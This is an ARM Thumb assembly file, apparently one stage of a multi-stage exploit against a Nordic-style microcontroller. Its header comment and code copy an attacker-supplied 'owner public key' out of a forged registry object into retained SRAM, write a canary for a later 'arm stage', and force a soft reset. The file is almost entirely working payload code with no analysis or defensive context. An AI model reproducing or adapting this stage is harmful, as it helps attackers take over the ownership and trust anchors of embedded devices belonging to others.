/*
 * Stage the owner public key in retained upper SRAM, then soft-reset normally.
 *
 * The first 56 key bytes are carried at record offsets 0x04...0x3b and the
 * final eight at 0x58...0x5f. Both spans are unused by the forged registry
 * object. A completion canary is written only after both copy loops finish;
 * the following arm stage refuses to continue without it.
 * No FPB, flash, NVMC, UICR, settings, or ACL register is touched.
 */

    .syntax unified
    .thumb

    .equ RECORD_KEY_PART1,       0x2001a190
    .equ RECORD_KEY_PART2,       0x2001a1e4
    .equ RETAINED_KEY,           0x2003c040
    .equ RETAINED_CANARY,        0x2003c080
    .equ KEY_CANARY_WORD,        0x4b455931
    .equ POWER_GPREGRET,         0x4000051c
    .equ SCB_AIRCR,              0xe000ed0c
    .equ AIRCR_SYSRESETREQ,      0x05fa0004

    .section .text.r1_fpb_key_stage, "ax", %progbits
    .global r1_fpb_key_stage
    .type r1_fpb_key_stage, %function
    .thumb_func
r1_fpb_key_stage:
    ldr     r0, =RECORD_KEY_PART1
    ldr     r1, =RETAINED_KEY
    movs    r2, #14
1:
    ldr     r3, [r0], #4
    str     r3, [r1]
    adds    r1, #4
    subs    r2, #1
    bne     1b

    ldr     r0, =RECORD_KEY_PART2
    movs    r2, #2
2:
    ldr     r3, [r0], #4
    str     r3, [r1]
    adds    r1, #4
    subs    r2, #1
    bne     2b

    ldr     r0, =KEY_CANARY_WORD
    str     r0, [r1]
    ldr     r0, =POWER_GPREGRET
    movs    r1, #0
    strb    r1, [r0]
    dsb
    ldr     r1, =SCB_AIRCR
    ldr     r0, =AIRCR_SYSRESETREQ
    str     r0, [r1]
3:
    b       3b
    .ltorg
    .size r1_fpb_key_stage, .-r1_fpb_key_stage
